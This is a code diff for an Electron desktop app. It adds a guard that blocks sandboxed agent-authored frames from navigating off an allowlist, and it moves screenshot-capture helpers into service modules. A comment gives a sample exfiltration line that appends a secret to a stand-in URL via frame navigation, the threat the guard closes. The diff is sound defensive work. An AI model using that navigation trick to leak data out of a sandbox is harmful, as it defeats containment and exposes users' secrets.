@@ -182,6 +182,12 @@ import type {
   CaptureGestureShot,
 } from "../shared/types/captureGesture";
 import { LEGACY_MAX_CHAT_ATTACHMENT_BYTES } from "../shared/chatAttachmentLimits";
+import { fitCaptureShotToAttachmentLimit } from "./services/capture/captureShotFit";
+import { pickCaptureGestureWindow } from "./services/capture/captureGestureTarget";
+import {
+  reportCaptureGesture,
+  type CaptureGestureOutcome,
+} from "./services/analytics/captureGestureProductAnalytics";
 
 import {
   attentionNotchAppNavigation,
@@ -1085,6 +1091,32 @@ async function createWindow(args: {
     }
     if (url === allowed) return;
     event.preventDefault();
+  });
+
+  /**
+   * Scenes navigating themselves.
+   *
+   * A scene is agent-authored code in a sandboxed frame with its own origin and
+   * its own CSP (`connect-src 'none'`, no remote images), so it cannot FETCH
+   * anything out. Navigating the frame is the one route that policy does not
+   * close: `location = "https://elsewhere/?" + secret` is a navigation, not a
+   * fetch. The renderer's own `frame-src` already bounds where a nested
+   * context may go and is the first door; this is the second, because a
+   * `frame-src` widened for some unrelated reason must not silently reopen it.
+   *
+   * Main frames keep the stricter rule above. Subframes get the CSP's own
+   * allowlist restated: ADE's document, the dev server, a scene's two schemes,
+   * and a blank frame.
+   */
+  win.webContents.on("will-frame-navigate", (event) => {
+    if (event.isMainFrame) return;
+    const url = event.url;
+    if (url === getRendererUrl() || url === "about:blank") return;
+    if (url.startsWith("ade-scene:") || url.startsWith("blob:")) return;
+    const frameDevBase = process.env.VITE_DEV_SERVER_URL;
+    if (frameDevBase && url.startsWith(frameDevBase)) return;
+    event.preventDefault();
+    args.logger?.warn("window.frame_navigation_blocked", { url });
   });
 
   let recoveredOutdatedOptimizeDep = false;
@@ -8316,83 +8348,30 @@ app.whenReady().then(async () => {
   });
 
   /**
-   * Where a capture lands. The focused ADE window when there is one, otherwise
-   * any live window — never a newly opened one, because the gesture must be
-   * able to fire while ADE is in the background without conjuring a window the
-   * user did not ask for.
-   *
-   * The middle step is the one that matters in practice: the gesture's whole
-   * point is firing over ANOTHER app's window, so `getFocusedWindow()` is null
-   * exactly when a capture happens, and `getAllWindows()[0]` is creation order
-   * — an arbitrary project, usually not the one the user was last in.
-   * `lastFocusedAdeWindowId` remembers which window that was.
+   * Where a capture lands. The order is `pickCaptureGestureWindow`; what main
+   * adds is the liveness filter, which only Electron can answer.
+   * `lastFocusedAdeWindowId` remembers the window the user was last in.
    */
   const captureGestureWindow = (): BrowserWindow | null => {
     const liveWindows = BrowserWindow.getAllWindows().filter(
       (win) => !win.isDestroyed() && !win.webContents.isDestroyed(),
     );
-    const lastFocused = lastFocusedAdeWindowId == null
-      ? null
-      : liveWindows.find((win) => win.id === lastFocusedAdeWindowId) ?? null;
-    const candidate = BrowserWindow.getFocusedWindow() ?? lastFocused ?? liveWindows[0] ?? null;
+    const focused = BrowserWindow.getFocusedWindow();
+    const candidate = pickCaptureGestureWindow({
+      liveWindows,
+      // A focused window that is mid-teardown is not a target.
+      focused: focused && !focused.isDestroyed() && !focused.webContents.isDestroyed() ? focused : null,
+      lastFocusedId: lastFocusedAdeWindowId,
+    });
     if (!candidate || candidate.isDestroyed() || candidate.webContents.isDestroyed()) return null;
     return candidate;
   };
 
-  /**
-   * Shrink a shot until it fits the base64 attachment ceiling.
-   *
-   * The helper's own cap is generous (a 6K display is ~10 MB of PNG and a
-   * multi-monitor grab can be far more), but `saveTempAttachment` moves the
-   * bytes as base64 inside a command payload and rejects anything over
-   * {@link LEGACY_MAX_CHAT_ATTACHMENT_BYTES}. Left alone, a big display's
-   * capture reached the composer and then failed to stage, so the gesture
-   * silently did nothing. Downscaling keeps the shot — a half-size screenshot
-   * is still a perfectly readable screenshot — and only a shot that will not
-   * fit after four halvings fails, with a message that says why.
-   */
-  const fitCaptureShotToAttachmentLimit = (shot: CaptureGestureShot): CaptureGestureShot | null => {
-    let bytes: Buffer = Buffer.from(shot.pngBase64, "base64");
-    if (bytes.byteLength <= LEGACY_MAX_CHAT_ATTACHMENT_BYTES) return shot;
-    let image = nativeImage.createFromBuffer(bytes);
-    for (let attempt = 0; attempt < 4; attempt += 1) {
-      const size = image.getSize();
-      if (size.width < 2 || size.height < 2) break;
-      // Width only: `resize` preserves the aspect ratio when just one
-      // dimension is given, so the shot never stretches.
-      image = image.resize({ width: Math.max(1, Math.floor(size.width / 2)), quality: "good" });
-      bytes = image.toPNG();
-      if (!bytes.byteLength) break;
-      if (bytes.byteLength <= LEGACY_MAX_CHAT_ATTACHMENT_BYTES) {
-        return { ...shot, pngBase64: bytes.toString("base64") };
-      }
-    }
-    return null;
-  };
-
-  /**
-   * One coarse fact per capture-gesture press.
-   *
-   * Emitted where the shot is delivered or refused, which is the only place
-   * that knows whether the gesture actually worked — the renderer sees the
-   * result, and the helper sees the press, but neither sees both. Never the
-   * window, its title, the app it belonged to, the temp path the PNG passed
-   * through, the image, or the helper's error text.
-   *
-   * Deduped by minute rather than per press: the product question is whether
-   * the gesture works for an installation, and a user who fires it four times
-   * in a row while something is broken is one fact, not four.
-   */
-  const CAPTURE_GESTURE_ANALYTICS_DEDUPE_MS = 60_000;
-  const reportCaptureGesture = (outcome: "delivered" | "failed" | "too_large"): void => {
-    productAnalyticsService?.captureInternal({
-      event: "ade_feature_used",
-      surface: "desktop",
-      properties: { feature: "cto", action: "capture_gesture", outcome },
-      dedupeKey: `capture_gesture:${outcome}`,
-      minimumIntervalMs: CAPTURE_GESTURE_ANALYTICS_DEDUPE_MS,
-    });
-  };
+  /** Both halves live in services; main keeps only the two call sites. */
+  const fitShot = (shot: CaptureGestureShot): CaptureGestureShot | null =>
+    fitCaptureShotToAttachmentLimit(shot, { fromBuffer: (bytes) => nativeImage.createFromBuffer(bytes) });
+  const reportCapture = (outcome: CaptureGestureOutcome): void =>
+    reportCaptureGesture(productAnalyticsService, outcome);
 
   captureHelper = new CaptureHelper({
     executablePath: resolveCaptureHelperExecutablePath({
@@ -8418,9 +8397,9 @@ app.whenReady().then(async () => {
     onShot: (shot: CaptureGestureShot) => {
       const target = captureGestureWindow();
       if (!target) return;
-      const fitted = fitCaptureShotToAttachmentLimit(shot);
+      const fitted = fitShot(shot);
       if (!fitted) {
-        reportCaptureGesture("too_large");
+        reportCapture("too_large");
         target.webContents.send(IPC.captureGestureFailed, {
           reason: "capture-failed",
           source: shot.source,
@@ -8434,7 +8413,7 @@ app.whenReady().then(async () => {
       activateAppForAttentionNotch();
       foregroundAttentionWindow(target);
       target.webContents.send(IPC.captureGestureShot, fitted);
-      reportCaptureGesture("delivered");
+      reportCapture("delivered");
     },
     onFailure: (failure: CaptureGestureFailure) => {
       const target = captureGestureWindow();
@@ -8444,7 +8423,7 @@ app.whenReady().then(async () => {
       // front" is worse than the failure.
       target.webContents.send(IPC.captureGestureFailed, failure);
       // The coarse fact only; `failure.reason` and its message stay local.
-      reportCaptureGesture("failed");
+      reportCapture("failed");
     },
   });
   // Sleep does not always lock the machine, so resume must clear suspension
